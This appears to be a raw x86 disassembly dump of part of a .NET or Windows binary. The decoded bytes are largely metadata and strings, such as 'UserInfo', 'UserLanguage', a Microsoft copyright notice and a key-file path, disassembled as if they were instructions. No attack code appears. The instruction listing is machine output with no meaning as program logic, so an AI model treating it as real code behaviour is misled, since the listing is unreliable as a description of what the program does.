  40d802:	add    eax,0x1d022007
  40d807:	sbb    al,0x12
  40d809:	xor    eax,0xb071c02
  40d80e:	adc    eax,0xe023912
  40d813:	adc    cl,BYTE PTR [edx+edx*1]
  40d816:	sub    eax,0x8121c1d
  40d81b:	adc    cl,BYTE PTR [ebx*1+0x1d18121c]
  40d822:	adc    ch,BYTE PTR ds:0x81c1d08
  40d828:	or     dl,BYTE PTR ds:0x15013d12
  40d82e:	adc    DWORD PTR [ecx+0x2],eax
  40d831:	push   cs
  40d832:	push   cs
  40d833:	push   es
  40d834:	adc    eax,0x12013d12
  40d839:	or     al,0x5
  40d83b:	add    BYTE PTR [edx],al
  40d83d:	push   cs
  40d83e:	push   cs
  40d83f:	push   cs
  40d840:	push   es
  40d841:	adc    eax,0xe024111
  40d846:	push   cs
  40d847:	push   cs
  40d848:	and    BYTE PTR [eax],al
  40d84a:	adc    eax,0x15014912
  40d84f:	adc    DWORD PTR [ecx+0x2],eax
  40d852:	adc    eax,DWORD PTR [eax]
  40d854:	adc    eax,DWORD PTR [ecx]
  40d856:	or     edx,DWORD PTR ds:0x15014912
  40d85c:	adc    DWORD PTR [ecx+0x2],eax
  40d85f:	or     BYTE PTR [edx],dl
  40d861:	sbb    BYTE PTR [edi],al
  40d863:	adc    eax,0x8024111
  40d868:	adc    bl,BYTE PTR [eax]
  40d86a:	or     DWORD PTR [eax],esp
  40d86c:	add    BYTE PTR ds:0x10d8111,dl
  40d872:	adc    eax,DWORD PTR [eax]
  40d874:	or     edx,DWORD PTR ds:0x10d8111
  40d87a:	adc    eax,0xe024111
  40d87f:	push   cs
  40d880:	inc    edi
  40d881:	pop    es
  40d882:	unpckhps xmm2,XMMWORD PTR [edx]
  40d885:	cmp    eax,0x41111501
  40d88a:	add    cl,BYTE PTR [esi]
  40d88c:	push   cs
  40d88d:	adc    eax,0x12013d12
  40d892:	or     al,0x12
  40d894:	or     al,0xe
  40d896:	push   cs
  40d897:	adc    eax,0x8024111
  40d89c:	adc    bl,BYTE PTR [eax]
  40d89e:	adc    bl,BYTE PTR [eax]
  40d8a0:	push   cs
  40d8a1:	push   cs
  40d8a2:	push   cs
  40d8a3:	or     BYTE PTR ds:0xe024111,dl
  40d8a9:	push   cs
  40d8aa:	adc    eax,0x2f58011
  40d8af:	push   cs
  40d8b0:	adc    cl,BYTE PTR [edx*1+0x15014912]
  40d8b7:	adc    DWORD PTR [ecx+0x2],eax
  40d8ba:	or     BYTE PTR [edx],dl
  40d8bc:	sbb    BYTE PTR ds:0x10d8111,dl
  40d8c2:	adc    eax,0xe024111
  40d8c7:	push   cs
  40d8c8:	add    eax,0x3010220
  40d8cd:	or     BYTE PTR [ecx],ah
  40d8cf:	pop    es
  40d8d0:	or     ecx,DWORD PTR [eax]
  40d8d2:	or     BYTE PTR [esi],cl
  40d8d4:	adc    eax,0xe024111
  40d8d9:	push   cs
  40d8da:	or     BYTE PTR [eax],cl
  40d8dc:	sbb    eax,0x28122812
  40d8e1:	adc    eax,0x10d8111
  40d8e6:	adc    eax,0xe024111
  40d8eb:	push   cs
  40d8ec:	sbb    eax,0x8082812
  40d8f1:	pop    es
  40d8f2:	add    eax,0x1c120808
  40d8f7:	or     BYTE PTR [esi],cl
  40d8f9:	add    eax,DWORD PTR [edi]
  40d8fb:	add    DWORD PTR [eax],ecx
  40d8fd:	add    eax,0x81120000
  40d902:	adc    eax,0x12002005
  40d907:	sbb    DWORD PTR [ecx],0x12010705
  40d90d:	sbb    DWORD PTR [ecx],0x12002005
  40d913:	sbb    DWORD PTR ds:0x4000122,0x706c6568
  40d91d:	add    DWORD PTR [edi],edi
  40d91f:	adc    al,0x55
  40d921:	jae    0x40d984
  40d923:	addr16 gs dec eax
  40d926:	gs ins BYTE PTR es:[edi],dx
  40d928:	jo     0x40d96e
  40d92a:	gs jae 0x40d990
  40d92d:	jb     0x40d998
  40d92f:	jo     0x40d9a5
  40d931:	imul   ebp,DWORD PTR [edi+0x6e],0x101
  40d938:	and    eax,0x6e060001
  40d93d:	outs   dx,DWORD PTR ds:[esi]
  40d93e:	ins    BYTE PTR es:[edi],dx
  40d93f:	outs   dx,DWORD PTR ds:[esi]
  40d940:	outs   dx,DWORD PTR ds:[si]
  40d942:	call   DWORD PTR [esi]
  40d944:	push   ebp
  40d945:	jae    0x40d9a8
  40d947:	addr16 gs dec esi
  40d94a:	outs   dx,DWORD PTR ds:[esi]
  40d94b:	dec    esp
  40d94c:	outs   dx,DWORD PTR ds:[esi]
  40d94d:	outs   dx,DWORD PTR ds:[si]
  40d94f:	inc    esp
  40d950:	gs jae 0x40d9b6
  40d953:	jb     0x40d9be
  40d955:	jo     0x40d9cb
  40d957:	imul   ebp,DWORD PTR [edi+0x6e],0x101
  40d95e:	sbb    DWORD PTR [ecx],eax
  40d960:	add    BYTE PTR [eax+0x1000000],al
  40d966:	add    BYTE PTR [edx+eax*1+0xd],dl
  40d96a:	inc    ecx
  40d96b:	ins    BYTE PTR es:[edi],dx
  40d96c:	ins    BYTE PTR es:[edi],dx
  40d96d:	outs   dx,DWORD PTR ds:[esi]
  40d96e:	ja     0x40d9bd
  40d970:	jne    0x40d9de
  40d972:	je     0x40d9dd
  40d974:	jo     0x40d9e2
  40d976:	add    DWORD PTR gs:[ecx],ecx
  40d979:	add    DWORD PTR [eax],eax
  40d97b:	add    al,0x49
  40d97d:	je     0x40d9e4
  40d97f:	ins    DWORD PTR es:[edi],dx
  40d980:	add    BYTE PTR [eax],al
  40d982:	push   es
  40d983:	adc    eax,0x11013d12
  40d988:	and    BYTE PTR [eax+eax*1],al
  40d98b:	add    DWORD PTR [edx],eax
  40d98d:	add    ecx,DWORD PTR [edx]
  40d98f:	pop    es
  40d990:	add    edx,DWORD PTR ds:0x11013d12
  40d996:	and    BYTE PTR [eax],cl
  40d998:	or     BYTE PTR ds:0x130120,al
  40d99e:	or     BYTE PTR [esi],al
  40d9a0:	pop    es
  40d9a1:	add    dl,BYTE PTR [ecx]
  40d9a3:	and    BYTE PTR [ecx],dl
  40d9a5:	and    BYTE PTR [edi],al
  40d9a7:	adc    eax,0x10d8111
  40d9ac:	adc    DWORD PTR [eax],esp
  40d9ae:	sbb    al,BYTE PTR [edi]
  40d9b0:	or     DWORD PTR ds:0x11013d12,edx
  40d9b6:	and    BYTE PTR [eax],cl
  40d9b8:	or     BYTE PTR [edx],al
  40d9ba:	add    dl,BYTE PTR [edx]
  40d9bc:	sub    ch,0x11
  40d9bf:	and    BYTE PTR [ecx],dl
  40d9c1:	and    BYTE PTR ds:0x10d8111,dl
  40d9c7:	adc    DWORD PTR [eax],esp
  40d9c9:	push   es
  40d9ca:	and    BYTE PTR [ecx],al
  40d9cc:	add    DWORD PTR [ecx],edx
  40d9ce:	sub    DWORD PTR ds:0x45121506,0x70e1c02
  40d9d8:	push   es
  40d9d9:	adc    eax,0xe024512
  40d9de:	add    al,BYTE PTR ds:0x13d1215
  40d9e4:	push   cs
  40d9e5:	push   es
  40d9e6:	adc    eax,0xe024512
  40d9eb:	add    al,BYTE PTR ds:0x1c010220
  40d9f1:	sbb    BYTE PTR [esi],dl
  40d9f3:	adc    BYTE PTR [ecx],al
  40d9f5:	add    dl,BYTE PTR ds:0x1e011912
  40d9fb:	add    BYTE PTR ds:0x1e011912,dl
  40da01:	add    BYTE PTR ds:0x1e024512,dl
  40da07:	add    BYTE PTR [edx],al
  40da09:	add    ecx,DWORD PTR [edx]
  40da0b:	add    DWORD PTR [esi],ecx
  40da0d:	or     al,0x10
  40da0f:	add    DWORD PTR [ecx],eax
  40da11:	sbb    eax,0x1215001e
  40da16:	sbb    DWORD PTR [ecx],eax
  40da18:	push   ds
  40da19:	add    BYTE PTR [edi+eax*1],al
  40da1c:	add    DWORD PTR ds:0x110130e,ebx
  40da22:	add    eax,DWORD PTR [edx]
  40da24:	adc    eax,0x1e011912
  40da29:	add    BYTE PTR [esi],bl
  40da2b:	add    BYTE PTR ds:0x1018112,dl
  40da31:	push   ds
  40da32:	add    BYTE PTR [ecx],cl
  40da34:	add    BYTE PTR [ebx],al
  40da36:	sbb    eax,0x110e0e0e
  40da3b:	add    DWORD PTR [ebp+0x9],0x15010120
  40da42:	adc    bl,BYTE PTR [ecx]
  40da44:	add    DWORD PTR [ebx],edx
  40da46:	add    BYTE PTR [ebx],al
  40da48:	pop    es
  40da49:	add    DWORD PTR [esi],ecx
  40da4b:	pop    es
  40da4c:	and    BYTE PTR [edx],al
  40da4e:	add    DWORD PTR ds:0x6080013,ebx
  40da54:	adc    eax,0x10d8111
  40da59:	push   cs
  40da5a:	add    eax,0x81120000
  40da5f:	dec    ebp
  40da60:	add    al,0x20
  40da62:	add    BYTE PTR [edx],dl
  40da64:	jno    0x40da6b
  40da66:	and    BYTE PTR [ecx],al
  40da68:	add    DWORD PTR [edx],edx
  40da6a:	jno    0x40da71
  40da6c:	add    BYTE PTR [eax],al
  40da6e:	adc    al,BYTE PTR [ecx+0x200551]
  40da74:	adc    al,BYTE PTR [ecx+0x7070d55]
  40da7a:	or     BYTE PTR [ecx],dl
  40da7c:	and    al,0x12
  40da7e:	push   esp
  40da7f:	adc    ah,BYTE PTR [ecx]
  40da81:	push   cs
  40da82:	or     BYTE PTR [ecx],dl
  40da84:	cmp    al,0x5
  40da86:	and    BYTE PTR [ecx],al
  40da88:	add    DWORD PTR [ecx],edx
  40da8a:	push   ebp
  40da8b:	add    eax,0x11010120
  40da90:	pop    ecx
  40da91:	add    eax,0x81120000
  40da96:	imul   eax,DWORD PTR [esi],0x12010120
  40da9c:	xor    DWORD PTR [ecx+0x6],0x12010120
  40daa3:	sub    DWORD PTR [ebp+0x9],0x81120200
  40daaa:	jne    0x40daba
  40daac:	adc    al,BYTE PTR [ecx+0x2200c5d]
  40dab2:	adc    eax,0x12015d12
  40dab7:	popa   
  40dab8:	adc    al,BYTE PTR [ecx+0x7140e75]
  40dabe:	add    eax,0x12598112
  40dac3:	sbb    DWORD PTR [ebp+0x12],0x81126d81
  40daca:	jne    0x40dae1
  40dacc:	adc    bl,BYTE PTR [ebp+0x1]
  40dacf:	adc    ah,BYTE PTR [ecx+0x6]
  40dad2:	adc    eax,0x12011912
  40dad7:	popa   
  40dad8:	or     BYTE PTR [eax],ah
  40dada:	add    BYTE PTR ds:0x13014912,dl
  40dae0:	add    BYTE PTR [esi],al
  40dae2:	adc    eax,0x12014912
  40dae7:	popa   
  40dae8:	add    al,0x20
  40daea:	add    BYTE PTR [ecx],dl
  40daec:	gs add eax,0x11010100
  40daf2:	push   ecx
  40daf3:	sysret 
  40daf5:	push   es
  40daf6:	or     BYTE PTR [eax],cl
  40daf8:	adc    ah,BYTE PTR [ecx+0x11]
  40dafb:	push   ecx
  40dafc:	push   cs
  40dafd:	adc    eax,0x12014912
  40db02:	popa   
  40db03:	add    al,0x0
  40db05:	add    BYTE PTR [ecx],dl
  40db07:	push   ecx
  40db08:	add    eax,0x51110207
  40db0d:	push   cs
  40db0e:	or     DWORD PTR [eax],eax
  40db10:	add    ecx,DWORD PTR [esi]
  40db12:	adc    al,BYTE PTR [ecx+0x1c1d0e81]
  40db18:	or     al,BYTE PTR [edi]
  40db1a:	add    eax,0x65110e0e
  40db1f:	sbb    eax,0x51c1d1c
  40db24:	and    BYTE PTR [edx],al
  40db26:	push   cs
  40db27:	or     BYTE PTR [ebx],al
  40db29:	push   es
  40db2a:	add    BYTE PTR [ebx],al
  40db2c:	push   cs
  40db2d:	push   cs
  40db2e:	push   cs
  40db2f:	push   cs
  40db30:	pop    es
  40db31:	pop    es
  40db32:	add    al,0xe
  40db34:	or     BYTE PTR [edx],dl
  40db36:	and    DWORD PTR [esi],ecx
  40db38:	add    eax,0x121d0107
  40db3d:	sub    BYTE PTR [edi],al
  40db3f:	add    BYTE PTR [edx],al
  40db41:	add    dl,BYTE PTR [edx]
  40db43:	imul   edx,DWORD PTR [edx],0x2200769
  40db49:	add    DWORD PTR [esi],ecx
  40db4b:	adc    DWORD PTR [ecx+0x1200589],eax
  40db51:	add    DWORD PTR [edx],edx
  40db53:	imul   eax,DWORD PTR [eax+eiz*1],0x4691200
  40db5a:	pop    es
  40db5b:	add    DWORD PTR [edx],edx
  40db5d:	imul   eax,DWORD PTR [esi],0xc120207
  40db63:	adc    DWORD PTR [eax+ecx*1],edi
  40db66:	mov    al,0x3f
  40db68:	pop    edi
  40db69:	jg     0x40db7c
  40db6b:	aad    0xa
  40db6d:	cmp    al,BYTE PTR ds:0x81120000
  40db73:	xchg   ebp,eax
  40db74:	add    eax,0xe1d0120
  40db79:	push   cs
  40db7a:	xor    al,BYTE PTR [ecx]
  40db7c:	add    BYTE PTR [edx],al
  40db7e:	imul   ebp,DWORD PTR [esi+0x16],0x67617355
  40db85:	gs dec ecx
  40db87:	outs   dx,BYTE PTR ds:[esi]
  40db88:	inc    ebx
  40db89:	jae    0x40dbef
  40db8b:	ins    BYTE PTR es:[edi],dx
  40db8c:	inc    esp
  40db8d:	gs jae 0x40dbf3
  40db90:	jb     0x40dbfb
  40db92:	jo     0x40dc08
  40db94:	imul   ebp,DWORD PTR [edi+0x6e],0x61735512
  40db9b:	addr16 gs inc esi
  40db9e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x65756c61
  40dba6:	dec    esi
  40dba7:	popa   
  40dba8:	ins    DWORD PTR es:[edi],dx
  40dba9:	add    BYTE PTR gs:[eax],al
  40dbac:	add    BYTE PTR [ebx],bh
  40dbae:	add    DWORD PTR [eax],eax
  40dbb0:	add    ebp,DWORD PTR [edi+0x75]
  40dbb3:	je     0x40dbd3
  40dbb5:	push   ebp
  40dbb6:	jae    0x40dc19
  40dbb8:	addr16 gs dec edi
  40dbbb:	jne    0x40dc31
  40dbbd:	dec    edi
  40dbbe:	bound  ebp,QWORD PTR [edx+0x65]
  40dbc1:	arpl   WORD PTR [esp+ecx*2+0x61],si
  40dbc5:	jns    0x40dc2c
  40dbc7:	jb     0x40dc0d
  40dbc9:	gs jae 0x40dc2f
  40dbcc:	jb     0x40dc37
  40dbce:	jo     0x40dc44
  40dbd0:	imul   ebp,DWORD PTR [edi+0x6e],0x61735512
  40dbd7:	addr16 gs inc esi
  40dbda:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x65756c61
  40dbe2:	dec    esi
  40dbe3:	popa   
  40dbe4:	ins    DWORD PTR es:[edi],dx
  40dbe5:	add    BYTE PTR gs:[eax],al
  40dbe8:	add    BYTE PTR [eax],dl
  40dbea:	add    DWORD PTR [eax],eax
  40dbec:	or     BYTE PTR [ecx+eiz*2+0x6e],ch
  40dbf0:	addr16 jne 0x40dc54
  40dbf3:	addr16 gs (bad) 
  40dbf6:	inc    DWORD PTR [eax]
  40dbf8:	add    BYTE PTR [eax],al
  40dbfa:	pusha  
  40dbfb:	add    DWORD PTR [eax],eax
  40dbfd:	push   ebp
  40dbfe:	xor    edx,DWORD PTR [ebx+0x79]
  40dc01:	jae    0x40dc77
  40dc03:	gs ins DWORD PTR es:[edi],dx
  40dc05:	cs inc esp
  40dc07:	popa   
  40dc08:	je     0x40dc6b
  40dc0a:	cs push ebx
  40dc0c:	gs jb  0x40dc85
  40dc0f:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  40dc16:	jae    0x40dc81
  40dc18:	outs   dx,BYTE PTR ds:[si]
  40dc1a:	cs inc ebx
  40dc1c:	ins    BYTE PTR es:[edi],dx
  40dc1d:	popa   
  40dc1e:	jae    0x40dc93
  40dc20:	inc    edi
  40dc21:	outs   dx,BYTE PTR gs:[esi]
  40dc23:	gs jb  0x40dc87
  40dc26:	je     0x40dc91
  40dc28:	outs   dx,DWORD PTR ds:[esi]
  40dc29:	outs   dx,BYTE PTR ds:[esi]
  40dc2a:	dec    esp
  40dc2b:	popa   
  40dc2c:	outs   dx,BYTE PTR ds:[esi]
  40dc2d:	addr16 jne 0x40dc91
  40dc30:	add    DWORD PTR gs:[bx+si],eax
  40dc34:	add    BYTE PTR [eax],al
  40dc36:	push   ds
  40dc37:	push   ebp
  40dc38:	jae    0x40dc9b
  40dc3a:	addr16 gs dec esp
  40dc3d:	popa   
  40dc3e:	outs   dx,BYTE PTR ds:[esi]
  40dc3f:	addr16 jne 0x40dca3
  40dc42:	addr16 gs inc ebx
  40dc45:	push   ebx
  40dc46:	push   0x44707261
  40dc4b:	gs jae 0x40dcb1
  40dc4e:	jb     0x40dcb9
  40dc50:	jo     0x40dcc6
  40dc52:	imul   ebp,DWORD PTR [edi+0x6e],0x0
  40dc59:	add    BYTE PTR [eax],al
  40dc5b:	pop    esp
  40dc5c:	add    DWORD PTR [eax],eax
  40dc5e:	push   ebp
  40dc5f:	xor    edx,DWORD PTR [ebx+0x79]
  40dc62:	jae    0x40dcd8
  40dc64:	gs ins DWORD PTR es:[edi],dx
  40dc66:	cs inc esp
  40dc68:	popa   
  40dc69:	je     0x40dccc
  40dc6b:	cs push ebx
  40dc6d:	gs jb  0x40dce6
  40dc70:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  40dc77:	jae    0x40dce2
  40dc79:	outs   dx,BYTE PTR ds:[si]
  40dc7b:	cs inc ebx
  40dc7d:	ins    BYTE PTR es:[edi],dx
  40dc7e:	popa   
  40dc7f:	jae    0x40dcf4
  40dc81:	inc    edi
  40dc82:	outs   dx,BYTE PTR gs:[esi]
  40dc84:	gs jb  0x40dce8
  40dc87:	je     0x40dcf2
  40dc89:	outs   dx,DWORD PTR ds:[esi]
  40dc8a:	outs   dx,BYTE PTR ds:[esi]
  40dc8b:	dec    esp
  40dc8c:	popa   
  40dc8d:	outs   dx,BYTE PTR ds:[esi]
  40dc8e:	addr16 jne 0x40dcf2
  40dc91:	add    BYTE PTR gs:[bx+si],al
  40dc95:	add    BYTE PTR [eax],al
  40dc97:	sbb    dl,BYTE PTR [ebp+0x73]
  40dc9a:	popa   
  40dc9b:	addr16 gs dec esp
  40dc9e:	popa   
  40dc9f:	outs   dx,BYTE PTR ds:[esi]
  40dca0:	addr16 jne 0x40dd04
  40dca3:	addr16 gs push esi
  40dca6:	bound  eax,QWORD PTR [ebp+eiz*2+0x73]
  40dcaa:	arpl   WORD PTR [edx+0x69],si
  40dcad:	jo     0x40dd23
  40dcaf:	imul   ebp,DWORD PTR [edi+0x6e],0x1
  40dcb6:	add    BYTE PTR [eax],al
  40dcb8:	sgdtd  [eax]
  40dcbb:	pop    es
  40dcbc:	push   esi
  40dcbd:	gs jb  0x40dd33
  40dcc0:	imul   ebp,DWORD PTR [edi+0x6e],0xffff
  40dcc7:	add    BYTE PTR [eax+0x1],ah
  40dcca:	add    BYTE PTR [ebp+0x3c],dl
  40dccd:	push   ebx
  40dcce:	jns    0x40dd43
  40dcd0:	je     0x40dd37
  40dcd2:	ins    DWORD PTR es:[edi],dx
  40dcd3:	cs inc esp
  40dcd5:	popa   
  40dcd6:	je     0x40dd39
  40dcd8:	cs push ebx
  40dcda:	gs jb  0x40dd53
  40dcdd:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  40dce4:	jae    0x40dd4f
  40dce6:	outs   dx,BYTE PTR ds:[si]
  40dce8:	cs inc esp
  40dcea:	popa   
  40dceb:	je     0x40dd4e
  40dced:	push   ebx
  40dcee:	jbe    0x40dd53
  40dcf0:	push   ebp
  40dcf1:	je     0x40dd5c
  40dcf3:	ins    BYTE PTR es:[edi],dx
  40dcf4:	cs inc edi
  40dcf6:	outs   dx,BYTE PTR gs:[esi]
  40dcf8:	gs jb  0x40dd5c
  40dcfb:	je     0x40dd62
  40dcfd:	fs inc ebx
  40dcff:	outs   dx,DWORD PTR ds:[esi]
  40dd00:	fs gs push esi
  40dd03:	gs jb  0x40dd79
  40dd06:	imul   ebp,DWORD PTR [edi+0x6e],0x0
  40dd0d:	adc    DWORD PTR [ebp+0x73],edx
  40dd10:	popa   
  40dd11:	addr16 gs push esi
  40dd14:	gs jb  0x40dd8a
  40dd17:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4431
  40dd1e:	xor    BYTE PTR [eax],al
  40dd20:	add    BYTE PTR [eax],al
  40dd22:	add    BYTE PTR [ebx],al
  40dd24:	xor    DWORD PTR [esi],ebp
  40dd26:	xor    BYTE PTR [eax],al
  40dd28:	add    BYTE PTR [eax+0x1],ah
  40dd2b:	add    BYTE PTR [ebp+0x3c],dl
  40dd2e:	push   ebx
  40dd2f:	jns    0x40dda4
  40dd31:	je     0x40dd98
  40dd33:	ins    DWORD PTR es:[edi],dx
  40dd34:	cs inc esp
  40dd36:	popa   
  40dd37:	je     0x40dd9a
  40dd39:	cs push ebx
  40dd3b:	gs jb  0x40ddb4
  40dd3e:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  40dd45:	jae    0x40ddb0
  40dd47:	outs   dx,BYTE PTR ds:[si]
  40dd49:	cs inc esp
  40dd4b:	popa   
  40dd4c:	je     0x40ddaf
  40dd4e:	push   ebx
  40dd4f:	jbe    0x40ddb4
  40dd51:	push   ebp
  40dd52:	je     0x40ddbd
  40dd54:	ins    BYTE PTR es:[edi],dx
  40dd55:	cs inc edi
  40dd57:	outs   dx,BYTE PTR gs:[esi]
  40dd59:	gs jb  0x40ddbd
  40dd5c:	je     0x40ddc3
  40dd5e:	fs inc ebx
  40dd60:	outs   dx,DWORD PTR ds:[esi]
  40dd61:	fs gs push esi
  40dd64:	gs jb  0x40ddda
  40dd67:	imul   ebp,DWORD PTR [edi+0x6e],0x1
  40dd6e:	adc    DWORD PTR [ebp+0x73],edx
  40dd71:	popa   
  40dd72:	addr16 gs push esi
  40dd75:	gs jb  0x40ddeb
  40dd78:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4432
  40dd7f:	xor    BYTE PTR [ecx],al
  40dd81:	add    BYTE PTR [eax],al
  40dd83:	add    BYTE PTR [ebx],al
  40dd85:	xor    ch,BYTE PTR [esi]
  40dd87:	xor    BYTE PTR [eax],al
  40dd89:	add    BYTE PTR [eax],bh
  40dd8b:	add    DWORD PTR [eax],eax
  40dd8d:	adc    eax,0x61746144
  40dd92:	push   ebx
  40dd93:	gs jb  0x40de0c
  40dd96:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  40dd9d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40dda2:	outs   dx,BYTE PTR ds:[esi]
  40dda3:	call   FWORD PTR [edx]
  40dda5:	push   ebp
  40dda6:	jae    0x40de09
  40dda8:	addr16 gs inc esp
  40ddab:	popa   
  40ddac:	je     0x40de0f
  40ddae:	push   ebx
  40ddaf:	gs jb  0x40de28
  40ddb2:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  40ddb9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40ddbe:	outs   dx,BYTE PTR ds:[esi]
  40ddbf:	add    DWORD PTR [ecx],eax
  40ddc1:	add    BYTE PTR [eax],al
  40ddc3:	xor    BYTE PTR [ecx],al
  40ddc5:	add    BYTE PTR [ebx],al
  40ddc7:	jne    0x40de3b
  40ddc9:	imul   edi,edi,0x61735513
  40ddcf:	addr16 gs push ebp
  40ddd2:	jb     0x40de3d
  40ddd4:	inc    esp
  40ddd5:	gs jae 0x40de3b
  40ddd8:	jb     0x40de43
  40ddda:	jo     0x40de50
  40dddc:	imul   ebp,DWORD PTR [edi+0x6e],0x61735511
  40dde3:	addr16 gs push ebp
  40dde6:	jb     0x40de51
  40dde8:	push   esi
  40dde9:	popa   
  40ddea:	ins    BYTE PTR es:[edi],dx
  40ddeb:	jne    0x40de52
  40dded:	dec    esi
  40ddee:	popa   
  40ddef:	ins    DWORD PTR es:[edi],dx
  40ddf0:	add    BYTE PTR gs:[eax],al
  40ddf3:	add    BYTE PTR [edi+eax*1],al
  40ddf6:	add    DWORD PTR ds:0x1081c,ebx
  40ddfc:	(bad)  
  40ddfd:	jg     0x40ddff
  40ddff:	add    BYTE PTR [eax],al
  40de01:	add    BYTE PTR ds:0x81120020,al
  40de07:	adc    eax,0x1022007
  40de0c:	push   cs
  40de0d:	adc    al,BYTE PTR [ecx+0x1100c15]
  40de13:	add    ebx,DWORD PTR [esi]
  40de15:	add    BYTE PTR [eax],dl
  40de17:	push   ds
  40de18:	add    BYTE PTR [esi],bl
  40de1a:	add    BYTE PTR [esi],bl
  40de1c:	add    BYTE PTR [edx+ecx*1],al
  40de1f:	add    DWORD PTR [edx],edx
  40de21:	je     0x40de27
  40de23:	pop    es
  40de24:	add    DWORD PTR [edx],edx
  40de26:	je     0x40de2e
  40de28:	and    BYTE PTR [edx],al
  40de2a:	push   cs
  40de2b:	push   cs
  40de2c:	adc    dh,BYTE PTR [ecx+0x7]
  40de2f:	pop    es
  40de30:	add    al,0x12
  40de32:	je     0x40de42
  40de34:	or     BYTE PTR [esi],cl
  40de36:	add    eax,0x1
  40de3b:	add    BYTE PTR ds:0x10001,al
  40de41:	add    BYTE PTR [ecx+eax*1],dl
  40de44:	add    BYTE PTR [edi],cl
  40de46:	inc    esp
  40de47:	popa   
  40de48:	je     0x40deab
  40de4a:	push   ebx
  40de4b:	jbe    0x40deb0
  40de4d:	push   ebp
  40de4e:	je     0x40deb9
  40de50:	ins    BYTE PTR es:[edi],dx
  40de51:	cs gs js 0x40deba
  40de55:	add    BYTE PTR [eax],al
  40de57:	sbb    al,BYTE PTR [ecx]
  40de59:	add    BYTE PTR ds:0x7263694d,dl
  40de5f:	outs   dx,DWORD PTR ds:[esi]
  40de60:	jae    0x40ded1
  40de62:	data16 je 0x40de85
  40de65:	inc    ebx
  40de66:	outs   dx,DWORD PTR ds:[esi]
  40de67:	jb     0x40ded9
  40de69:	outs   dx,DWORD PTR ds:[esi]
  40de6a:	jb     0x40decd
  40de6c:	je     0x40ded7
  40de6e:	outs   dx,DWORD PTR ds:[esi]
  40de6f:	outs   dx,BYTE PTR ds:[esi]
  40de70:	add    BYTE PTR [eax],al
  40de72:	pop    ds
  40de73:	add    DWORD PTR [eax],eax
  40de75:	sbb    cl,BYTE PTR [ebp+0x69]
  40de78:	arpl   WORD PTR [edx+0x6f],si
  40de7b:	jae    0x40deec
  40de7d:	data16 je 0x40de42
  40de80:	scas   al,BYTE PTR es:[edi]
  40de81:	and    BYTE PTR [esi],ch
  40de83:	dec    esi
  40de84:	inc    ebp
  40de85:	push   esp
  40de86:	and    BYTE PTR [esi+0x72],al
  40de89:	popa   
  40de8a:	ins    DWORD PTR es:[edi],dx
  40de8b:	gs ja  0x40defd
  40de8e:	jb     0x40defb
  40de90:	add    BYTE PTR [eax],al
  40de92:	xor    al,0x1
  40de94:	add    BYTE PTR [edi],ch
  40de96:	ret    0x20a9
  40de99:	dec    ebp
  40de9a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40dea1:	je     0x40dec3
  40dea3:	inc    ebx
  40dea4:	outs   dx,DWORD PTR ds:[esi]
  40dea5:	jb     0x40df17
  40dea7:	outs   dx,DWORD PTR ds:[esi]
  40dea8:	jb     0x40df0b
  40deaa:	je     0x40df15
  40deac:	outs   dx,DWORD PTR ds:[esi]
  40dead:	outs   dx,BYTE PTR ds:[esi]
  40deae:	and    BYTE PTR cs:[eax],ah
  40deb1:	inc    ecx
  40deb2:	ins    BYTE PTR es:[edi],dx
  40deb3:	ins    BYTE PTR es:[edi],dx
  40deb4:	and    BYTE PTR [edx+0x69],dh
  40deb7:	addr16 push 0x72207374
  40debd:	gs jae 0x40df25
  40dec0:	jb     0x40df38
  40dec2:	gs fs add BYTE PTR cs:[eax],al
  40dec7:	adc    eax,DWORD PTR [ecx]
  40dec9:	add    BYTE PTR [esi],cl
  40decb:	xor    ebp,DWORD PTR [esi]
  40decd:	xor    eax,0x3730332e
  40ded2:	xor    bh,BYTE PTR [ecx]
  40ded4:	cmp    BYTE PTR cs:[esi],dh
  40ded7:	aaa    
  40ded8:	xor    al,0x0
  40deda:	add    BYTE PTR [ecx+eax*1],cl
  40dedd:	add    BYTE PTR [edi],al
  40dedf:	xor    ebp,DWORD PTR [esi]
  40dee1:	xor    eax,0x302e302e
  40dee6:	add    BYTE PTR [eax],al
  40dee8:	or     al,BYTE PTR [ecx]
  40deea:	add    BYTE PTR ds:0x552d6e65,al
  40def0:	push   ebx
  40def1:	add    BYTE PTR [eax],al
  40def3:	sub    DWORD PTR [ecx],eax
  40def5:	add    BYTE PTR [esi+eiz*2],ah
  40def8:	cmp    bl,BYTE PTR [esp+eiz*2+0x64]
  40defc:	pop    esp
  40defd:	je     0x40df6e
  40deff:	outs   dx,DWORD PTR ds:[esi]
  40df00:	ins    BYTE PTR es:[edi],dx
  40df01:	jae    0x40df5f
  40df03:	fs gs jbe 0x40df6b
  40df07:	imul   esi,DWORD PTR [esi+0x5c],0x616d6345
  40df0e:	push   eax
  40df0f:	jne    0x40df73
  40df11:	ins    BYTE PTR es:[edi],dx
  40df12:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40df19:	outs   dx,BYTE PTR ds:[esi]
  40df1a:	imul   eax,DWORD PTR [eax],0x0
  40df1d:	or     BYTE PTR [ecx],al
  40df1f:	add    BYTE PTR [edx],al
  40df21:	add    BYTE PTR [eax],al
  40df23:	add    BYTE PTR [eax],al
  40df25:	add    BYTE PTR [eax],cl
  40df27:	add    DWORD PTR [eax],eax
  40df29:	or     BYTE PTR [eax],al
  40df2b:	add    BYTE PTR [eax],al
  40df2d:	add    BYTE PTR [eax],al
  40df2f:	push   ds
  40df30:	add    DWORD PTR [eax],eax
  40df32:	add    DWORD PTR [eax],eax
  40df34:	push   esp
  40df35:	add    dl,BYTE PTR [esi]
  40df37:	push   edi
  40df38:	jb     0x40df9b
  40df3a:	jo     0x40df8a
  40df3c:	outs   dx,DWORD PTR ds:[esi]
  40df3d:	outs   dx,BYTE PTR ds:[esi]
